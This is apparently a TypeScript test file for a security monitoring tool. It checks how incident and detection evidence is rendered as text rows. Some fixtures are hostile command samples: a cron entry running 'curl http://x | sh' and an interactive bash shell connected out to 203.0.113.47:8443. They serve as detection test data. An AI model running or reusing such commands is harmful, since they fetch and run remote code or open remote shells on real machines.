import { describe, expect, it } from 'vitest'
import { evidenceRows, INCIDENTS, isGrave } from './incidents'

const TITLES: Record<string, string> = { 'reverse-shell': 'Shell wired to a socket', 'server-child': 'Server process started a shell' }
const ruleTitle = (rule: string) => TITLES[rule] ?? rule

function rows(incident_type: string, evidence: unknown): string[] {
  return evidenceRows({ incident_type, evidence: JSON.stringify(evidence) }, ruleTitle).map((row) => `${row.label}: ${row.value}`)
}

describe('incident types', () => {
  it('gives every incident the server raises about a chain a title and one sentence', () => {
    for (const type of ['chain_gap', 'chain_fork', 'window_malformed', 'release_invalid', 'proof_invalid', 'proof_overdue', 'proving_stopped', 'match_not_released', 'release_not_proven']) {
      expect(INCIDENTS[type]!.title.length, type).toBeGreaterThan(8)
      expect(INCIDENTS[type]!.said, type).toMatch(/\.$/)
    }
  })

  it('marks an endpoint that proved a match it hid, or sent a proof that does not hold, as the grave ones', () => {
    expect(Object.keys(INCIDENTS).filter(isGrave)).toEqual(['proof_invalid', 'match_not_released'])
    expect(isGrave('detection.server-child')).toBe(false)
  })
})

describe('evidenceRows', () => {
  it('names the matches an endpoint proved and did not report, by the title of their rule', () => {
    const evidence = {
      epoch: 1,
      first_window: 0,
      last_window: 27,
      matches: [
        { trigger: 61, rule: 'reverse-shell', context: [20], pid: 2424, started_at: 1794848911 },
        { trigger: 61, rule: 'server-child', context: [20], pid: 2424, started_at: 1794848911 },
      ],
    }
    expect(rows('match_not_released', evidence)).toEqual([
      'proof: windows 0 to 27, epoch 1',
      'match: Shell wired to a socket: event #61, read #20, process 2424',
      'match: Server process started a shell: event #61, read #20, process 2424',
    ])
    expect(rows('release_not_proven', { epoch: 2, first_window: 4, last_window: 4, releases: [{ trigger: 9, rule: 'autostart-fetch', context: [], pid: 0, started_at: 5 }] })).toEqual([
      'proof: window 4, epoch 2',
      'release: autostart-fetch: event #9',
    ])
  })

  it('reads where a chain broke', () => {
    expect(rows('chain_gap', { window: 11, epoch: 1, first_index: 20 })).toEqual(['window: 11, epoch 1', 'missing: events before #20'])
    expect(rows('proving_stopped', { window: 31, epoch: 2 })).toEqual(['window: 31, epoch 2'])
    expect(
      rows('chain_fork', {
        reason: 'it is not the next window',
        window: 0,
        epoch: 1,
        first_index: 0,
        fresh: true,
        prev_head: '00'.repeat(32),
        head: 'ab'.repeat(32),
        stored_epoch: 3,
        stored_next_window: 12,
        stored_next_index: 40,
        stored_head: 'cd'.repeat(32),
      }),
    ).toEqual([
      'why: it is not the next window',
      'sent: window 0, epoch 1, from event #0, opening an epoch',
      'follows: 00000000…0000',
      'server: window 12 next, epoch 3, event #40 next',
      'head: cdcdcdcd…cdcd',
    ])
    expect(rows('window_malformed', { reason: 'Window 3 claims 2 events and carries 1', window: 3, epoch: 1, first_index: 8, count: 2, events: 1 })).toEqual([
      'why: Window 3 claims 2 events and carries 1',
      'window: 3, epoch 1',
      'claims: 2 events from #8',
      'carried: 1 events',
    ])
  })

  it('reads a release and a proof the server refused, and a proof that is late', () => {
    expect(rows('release_invalid', { reason: 'Its openings are not exactly its trigger and its context', window: 3, trigger: 9, rule: 'server-child', context: [2], opened: [9] })).toEqual([
      'why: Its openings are not exactly its trigger and its context',
      'rule: Server process started a shell',
      'window: 3',
      'named: event #9, read #2',
      'secrets: #9',
    ])
    expect(rows('proof_invalid', { reason: 'The receipt does not verify against an accepted rule program' })).toEqual(['why: The receipt does not verify against an accepted rule program'])
    const late = rows('proof_overdue', { window: 5, received_at: 1_700_000_000, waiting_secs: 3725, windows: 12 })
    expect(late[0]).toBe('waiting: 12 windows, from window 5')
    expect(late[1]).toMatch(/^since: \d{4}-\d\d-\d\d \d\d:\d\d:\d\d, 1h 2m when raised$/)
  })

  it('tells a finding by what ran, how and from where, and leaves its place in the chain to the proof line', () => {
    const evidence = { rule: 'shell-network', title: 'Shell with an outbound connection', technique: 'T1071', level: 'medium', pid: 11, started_at: 2, image: '/usr/bin/bash', command: '/usr/bin/bash -i', parent: 'kworker', subject: '203.0.113.47:8443', autostart: null, trigger: 7, window: 3, proof: 'pending' }
    expect(rows('detection.shell-network', evidence)).toEqual(['image: /usr/bin/bash', 'command: /usr/bin/bash -i', 'parent: kworker', 'touched: 203.0.113.47:8443'])
    expect(rows('detection.autostart-fetch', { image: '/etc/cron.d/sysupdate', command: 'curl http://x | sh', parent: null, subject: 'sysupdate', autostart: 'cron' })).toEqual([
      'image: /etc/cron.d/sysupdate',
      'command: curl http://x | sh',
      'item: sysupdate',
    ])
  })

  it('lists the evidence of any other incident as it is', () => {
    expect(rows('replay', { request: 'events', session: 2, seq: 1 })).toEqual(['request: events', 'session: 2', 'seq: 1'])
    expect(rows('silence', {})).toEqual([])
    expect(evidenceRows({ incident_type: 'replay', evidence: 'not json' }, ruleTitle)).toEqual([])
  })
})
